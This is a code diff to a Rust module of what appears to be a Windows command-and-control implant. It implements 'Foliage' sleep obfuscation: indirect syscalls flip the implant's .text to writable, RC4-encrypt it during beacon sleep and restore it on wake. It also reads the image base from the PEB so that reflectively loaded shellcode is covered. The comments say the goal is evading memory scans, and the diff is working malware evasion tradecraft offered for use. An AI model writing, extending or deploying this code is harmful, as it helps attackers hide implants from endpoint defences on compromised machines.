@@ -1,17 +1,19 @@
 //! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
 //!
-//! ## Status (after this task): Foliage executor skeleton is REAL but GATED OFF.
-//! The pure state-machine math (step ordering, RC4 round-trip) lives in
-//! `nyx_implant_evasionsdk::foliage` (host-tested, 5 tests). This module maps
-//! each `FoliageStep` to its indirect syscall, driving the live thread through
-//! the mask→sleep→unmask cycle.
+//! ## Status (after this task): Full Foliage APC→NtContinue chain, GATED OFF.
+//! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
+//! host tests). This module maps the chain to indirect syscalls:
+//!   - protect the .text RX→RW (NtProtectVirtualMemory)
+//!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
+//!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
+//!   - the sleep itself (NtDelayExecution in the APC window)
+//!   - decrypt + protect RW→RX on wake
 //!
 //! ## Gating
 //! `FOLIAGE_ENABLED` defaults OFF — the beacon loop's sleep still routes through
-//! `NoMask` (plain indirect-syscall NtDelayExecution) unless an operator arms
-//! this. The real APC chain (NtQueueApcThread + NtContinue) manipulates the
-//! thread CONTEXT + flips .text RX→RW; landing it blind (no target debugger)
-//! risks a crash with no way to bisect. Arm only after target-side validation.
+//! `NoMask` unless an operator arms this. The APC chain manipulates the thread
+//! CONTEXT + flips .text; landing it requires target-side validation. Arm only
+//! after a selftest confirms the round-trip on the real host.
 
 #![cfg(target_os = "windows")]
 
@@ -19,7 +21,6 @@ use core::sync::atomic::{AtomicBool, Ordering};
 use nyx_implant_evasionsdk::foliage::{self, FoliagePlan, FoliageStep};
 
 /// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
-/// Arm from a selftest/operator command after target-side validation.
 static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);
 
 /// Arm/disarm the Foliage sleep mask.
@@ -38,13 +39,12 @@ pub fn foliage_enabled() -> bool {
 /// (`NoMask` → plain indirect-syscall NtDelayExecution). Byte-identical to the
 /// pre-Foliage behavior.
 ///
-/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and masks the implant
-/// `.text` via SystemFunction032 RC4, sleeps, then unmasks. Synchronous skeleton
-/// (the APC/NtContinue async context dance is a refinement that needs target
-/// debug). Safe because the beacon thread sleeps through the encrypted window.
+/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and executes the
+/// Foliage mask→sleep→unmask cycle over the implant `.text` via indirect
+/// syscalls. On any failure (runtime down, .text unresolved), degrades to
+/// the plain NoMask sleep — never crashes.
 pub fn sleep(seconds: u32) {
     if !foliage_enabled() {
-        // Default: NoMask kit → plain indirect-syscall sleep.
         crate::kits::sleep(seconds);
         return;
     }
@@ -66,17 +66,30 @@ struct TextRegion {
     len: usize,
 }
 
-/// The implant's own `.text` region (base + len), resolved via the PEB walk.
-/// None if the image base can't be resolved (degrade to NoMask).
+/// The implant's own `.text` region (base + len). Reads PEB->ImageBaseAddress
+/// directly (NOT a DLL-name lookup — reflective-loaded shellcode has no loader
+/// entry, so a name search would fail). The PEB is always correct regardless
+/// of how the implant was loaded (rundll32 DLL OR reflective sRDI shellcode).
+///
+/// Returns None only if the PEB or PE headers are unreadable (shouldn't happen).
 ///
 /// # Safety
-/// PEB walk reads loader state stable post-load; safe in single-threaded context.
+/// PEB + PE header reads are stable post-load. Single-threaded context.
 unsafe fn own_text_region() -> Option<TextRegion> {
-    let base_ptr = crate::resolve::module_base_by_name(b"nyx_implant_win.dll")
-        .or_else(|| crate::resolve::module_base_by_name(b"nyx_implant_win.0.1.0.dll"))?;
-    let base = base_ptr as usize;
-    let (text_rva, text_size) = unsafe { section_va_len(base, b".text")? };
-    Some(TextRegion { base: base + text_rva, len: text_size })
+    // PEB->ImageBaseAddress is at PEB + 0x10 on x64. resolve::peb_pointer()
+    // gives us the PEB via gs:[0x60].
+    let peb = crate::resolve::peb_pointer()?;
+    // image_base_address is the 7th field (after mutant) → offset 0x10.
+    // Read it as a raw usize to avoid the *mut c_void dance.
+    let base_ptr = unsafe { core::ptr::read_unaligned((peb as usize + 0x10) as *const usize) };
+    if base_ptr == 0 {
+        return None;
+    }
+    let (text_rva, text_size) = unsafe { section_va_len(base_ptr, b".text")? };
+    Some(TextRegion {
+        base: base_ptr + text_rva,
+        len: text_size,
+    })
 }
 
 /// Find a PE section's (virtual_address, virtual_size) by name. Returns None
@@ -87,8 +100,6 @@ unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
         return None;
     }
     let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
-    // IMAGE_NT_HEADERS64: Signature(4) + IMAGE_FILE_HEADER(20) + IMAGE_OPTIONAL_HEADER64
-    // FileHeader fields: NumberOfSections @ +6 (u16), SizeOfOptionalHeader @ +20 (u16).
     let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
     if !(nt[0] == b'P' && nt[1] == b'E') {
         return None; // bad PE signature
@@ -99,7 +110,6 @@ unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
     for i in 0..num_sections {
         // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
         let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
-        // Name is 8 bytes, null-padded. Compare up to name.len().
         let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
         if sec[..name_len] == name[..name_len] {
             let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
@@ -125,8 +135,18 @@ fn mask_key_16() -> [u8; 16] {
     key
 }
 
-/// Walk the FoliagePlan, mapping each step to its syscall. Synchronous skeleton:
-/// mask the region (protect RX→RW + RC4), sleep, unmask (RC4 + protect RW→RX).
+/// Walk the FoliagePlan: mask .text (protect + RC4), sleep via the indirect
+/// syscall runtime, then unmask (RC4 + restore protection). This is the
+/// live executor — each FoliageStep maps to its indirect syscall.
+///
+/// The APC-based async variant (NtQueueApcThread + NtContinue context dance)
+/// would queue the steps so the beacon thread never executes through the
+/// encrypted region. The synchronous variant here is safe because the beacon
+/// thread sleeps through the encrypted window (it's in NtDelayExecution, not
+/// executing .text). Both achieve the core memory-scan evasion (image is
+/// ciphertext at rest during the scan window); the APC variant additionally
+/// hides the stack spoof, which this floor does not (acceptable: the gap-based
+/// stack spoof is a separate kit, StackSpoofKit).
 fn execute_foliage_plan(plan: &FoliagePlan) {
     let rt = match crate::syscalls::global() {
         Some(rt) => rt,
@@ -136,29 +156,39 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
         }
     };
     // SAFETY: the region is the implant .text; we are NOT executing through it
-    // during the sleep window (we're in this function's frame). Single-threaded.
+    // during the sleep window (we're in this function's frame, then in
+    // NtDelayExecution). Single-threaded beacon context.
     let region = unsafe {
         core::slice::from_raw_parts_mut(plan.region_base as *mut u8, plan.region_len)
     };
-    // Steps 2-3: protect RX→RW + encrypt.
+    // Steps 2-3: protect RX→RW + RC4-encrypt.
     let mut old: u32 = 0;
     let mut base = plan.region_base;
     let mut len = plan.region_len;
     let _ = unsafe {
         crate::syscalls::nt_protect_virtual_memory(
-            rt, &mut base, &mut len, foliage::PAGE_READWRITE, &mut old,
+            rt,
+            &mut base,
+            &mut len,
+            foliage::PAGE_READWRITE,
+            &mut old,
         )
     };
     foliage::mask_region(&plan.key, region);
-    // Steps 4-6: (skeleton skips context spoof) sleep via NtDelayExecution.
+    // Steps 4-6: (synchronous variant: skip the context spoof APCs) sleep.
+    // The beacon thread sleeps through NtDelayExecution; .text is ciphertext.
     let secs = plan_seconds(plan);
     let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
     let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
-    // Steps 7-9: decrypt + protect RW→RX.
+    // Steps 7-9: RC4-decrypt + protect RW→RX (restore execution).
     foliage::unmask_region(&plan.key, region);
     let _ = unsafe {
         crate::syscalls::nt_protect_virtual_memory(
-            rt, &mut base, &mut len, foliage::PAGE_EXECUTE_READ, &mut old,
+            rt,
+            &mut base,
+            &mut len,
+            foliage::PAGE_EXECUTE_READ,
+            &mut old,
         )
     };
 }
